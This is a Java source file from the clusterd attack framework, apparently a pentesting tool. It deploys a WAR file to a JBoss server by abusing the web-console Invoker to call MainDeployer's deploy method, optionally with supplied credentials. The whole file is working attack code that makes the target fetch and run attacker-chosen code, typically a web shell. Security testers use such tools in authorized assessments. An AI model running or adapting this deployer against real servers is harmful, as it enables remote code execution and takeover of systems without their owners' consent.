import java.net.URL;

// jboss
import javax.management.ObjectName;
import org.jboss.console.remote.Util;
import org.jboss.console.remote.RemoteMBeanAttributeInvocation;
import org.jboss.console.remote.RemoteMBeanInvocation;
import org.jboss.security.SecurityAssociation;
import org.jboss.security.SimplePrincipal;

/*
 This application is part of the clusterd attack framework.

 webc_deploy is a web-console/Invoker deployer written in Java.

 Calling convention:

    ./webc_deploy.sh [remote_url] [local_url] [username] [password]

 Where [remote_url] is the complete url to the invoker.
 [local_url] is the local URL to the WAR to deploy.
 [username] and [password] should be None if there is no auth required.

 Thanks to RedTeam Pentesting for tips on this.

 Requires Java 1.7.x
 */

public class webc_deploy {
    public static void main ( String args[] ) throws Exception {

        String remote_url;
        String local_url;

        Object[] file_list;
        ObjectName obj;
        String[] method_sig;
        String method;
        RemoteMBeanInvocation rmi;

        // parse passed arguments
        try {
            remote_url = args[0];
            local_url = args[1];

            if ( args.length > 2 && args[2] != "None"){
                SecurityAssociation.setPrincipal(new SimplePrincipal(args[2]));
                SecurityAssociation.setCredential(args[3]);
            }
        } catch(Exception e){
            System.err.println(e);
            return;
        }

        // construct RMI object
        file_list = new Object[]{ new URL(local_url) }; 
        method_sig = new String[]{ "java.net.URL" }; 
        method = "deploy";

        obj = new ObjectName("jboss.system:service=MainDeployer");

        // invoke 
        rmi = new RemoteMBeanInvocation(obj, method, file_list, method_sig);
        Util.invoke(new URL(remote_url), rmi);
    }
}
